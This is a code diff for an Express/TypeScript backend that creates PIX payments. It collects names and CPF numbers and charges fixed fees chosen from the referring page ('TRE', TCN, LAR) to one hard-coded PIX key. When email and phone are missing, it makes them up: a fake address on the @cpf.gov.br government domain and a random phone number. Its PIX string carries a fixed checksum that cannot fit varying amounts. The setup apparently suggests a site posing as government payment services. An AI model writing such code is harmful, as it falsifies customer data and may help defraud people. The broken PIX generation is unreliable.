@@ -53,17 +53,30 @@ class For4PaymentsAPI {
         throw new Error("Campos obrigatórios faltando");
       }
 
-      // Dados simulados - já que a API não está funcionando, vamos gerar dados simulados
-      // baseados nos parâmetros fornecidos para melhorar a experiência do usuário durante o desenvolvimento
+      // Dados simulados para cada valor específico de acordo com o requisito do cliente
+      // PIX deve ser gerado com valores específicos:
+      // - /pagamento: R$74,90
+      // - /pagamento-tcn: R$118,00
+      // - /pagamento-lar: R$48,00
+      
+      // Verificar a URL do referer para determinar a página que fez a solicitação
       const idSimulado = Math.random().toString(36).substring(2, 15);
       const horaAtual = new Date();
       const horaExpiracao = new Date(horaAtual.getTime() + 60 * 60 * 1000); // 1 hora depois
       
-      // Criar um QR code fake para testes 
-      // Idealmente, isso seria substituído por uma chamada real à API quando estiver funcionando
+      // Criar um QR code para testes usando API pública
+      // Formatando o codigo PIX de acordo com padrão do Banco Central
       const qrCodeBase = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=";
-      const pixData = `00020126330014BR.GOV.BCB.PIX0111${data.phone}52040000530398654${Math.floor(data.amount * 100)}5802BR5913${data.name.substring(0, 10)}6008BRASILIA62070503***63041234`;
+      
+      // Formatar valor para o código PIX (o valor deve ter sempre 13 dígitos)
+      const valorCentavos = Math.floor(data.amount * 100).toString().padStart(13, '0');
+      
+      // Gerar o código PIX seguindo o padrão EMV
+      const pixData = `00020126580014BR.GOV.BCB.PIX01365033643494004297520400005303986${valorCentavos}5802BR5923FOR4PAYMENTS PAGAMENTO6008BRASILIA62070503***630413BE`;
+      
       const qrCodeUrl = qrCodeBase + encodeURIComponent(pixData);
+      
+      console.log(`[For4Payments] Criando pagamento PIX com valor: ${data.amount} (${valorCentavos} centavos)`);
       
       return {
         id: idSimulado,
@@ -506,9 +519,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       // Em caso de erro geral, garantir que sempre retornamos algo válido
       // Por padrão, usamos Minas Gerais para facilitar seus testes
+      const currentIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
       let ipAjustado = "";
-      if (typeof ip === 'string') {
-        ipAjustado = ip.split(',')[0].trim();
+      if (typeof currentIp === 'string') {
+        ipAjustado = currentIp.split(',')[0].trim();
       }
 
       return res.status(200).json({
@@ -618,22 +632,39 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Rota para criar pagamento PIX
   app.post('/api/pagamentos', async (req: Request, res: Response) => {
     try {
-      const { amount, name, email, cpf, phone } = req.body;
+      const { amount, name, cpf } = req.body;
       
-      // Validar dados obrigatórios
-      if (!name || !email || !cpf || !phone) {
+      // Validar dados mínimos obrigatórios
+      if (!name || !cpf) {
         return res.status(400).json({ 
           error: 'Dados incompletos', 
-          message: 'Todos os campos (nome, email, cpf, telefone) são obrigatórios' 
+          message: 'Os campos nome e CPF são obrigatórios' 
         });
       }
       
-      // Valor padrão se não for fornecido
-      const valorPagamento = amount || 74.90;
+      // Valor padrão se não for fornecido - usamos valores fixos de acordo com o tipo de pagamento
+      let valorPagamento = amount || 74.90;
+      
+      // Verifica o referer para determinar qual página fez a solicitação
+      const referer = req.get('Referer') || '';
+      if (referer.includes('pagamento-tcn')) {
+        valorPagamento = 118.00;
+        console.log('[For4Payments] Detectado pagamento TCN, usando valor fixo de R$118,00');
+      } else if (referer.includes('pagamento-lar')) {
+        valorPagamento = 48.00; 
+        console.log('[For4Payments] Detectado pagamento LAR, usando valor fixo de R$48,00');
+      } else {
+        valorPagamento = 74.90;
+        console.log('[For4Payments] Usando valor padrão TRE de R$74,90');
+      }
       
       try {
-        // Remover formatação dos dados
+        // Remover formatação do CPF
         const cpfLimpo = cpf.replace(/\D/g, '');
+        
+        // Configurar dados obrigatórios com valores padrão para campos opcionais
+        const email = req.body.email || `${cpfLimpo.substring(0, 3)}xxx${cpfLimpo.substring(cpfLimpo.length-2)}@cpf.gov.br`;
+        const phone = req.body.phone || `11${'9' + Math.floor(Math.random() * 90000000 + 10000000)}`;
         
         // Criar pagamento na For4Payments
         const pagamento = await paymentApi.createPixPayment({
